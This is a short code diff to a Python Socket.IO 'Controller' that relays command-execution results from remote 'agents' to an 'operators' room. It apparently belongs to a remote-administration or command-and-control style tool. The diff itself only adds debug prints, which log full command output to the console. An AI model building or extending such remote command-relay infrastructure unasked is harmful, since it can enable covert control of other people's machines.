@@ -4050,6 +4050,8 @@ def handle_performance_update(data):
 @socketio.on('command_result')
 def handle_command_result(data):
     """Handle command execution results from agents"""
+    print(f"🔍 Controller: Command result received: {data}")
+    
     agent_id = data.get('agent_id')
     execution_id = data.get('execution_id')
     command = data.get('command')
@@ -4057,8 +4059,12 @@ def handle_command_result(data):
     success = data.get('success', False)
     execution_time = data.get('execution_time', 0)
     
+    print(f"🔍 Controller: Processing command result for agent {agent_id}")
+    print(f"🔍 Controller: Command: {command}")
+    print(f"🔍 Controller: Output length: {len(output)}")
+    
     # Broadcast command result to operators
-    emit('command_result', {
+    result_data = {
         'agent_id': agent_id,
         'execution_id': execution_id,
         'command': command,
@@ -4066,7 +4072,11 @@ def handle_command_result(data):
         'success': success,
         'execution_time': execution_time,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
-    }, room='operators', broadcast=True)
+    }
+    
+    print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
+    emit('command_result', result_data, room='operators', broadcast=True)
+    print(f"🔍 Controller: Command result broadcasted successfully")
     
     # Log activity
     if agent_id in AGENTS_DATA:
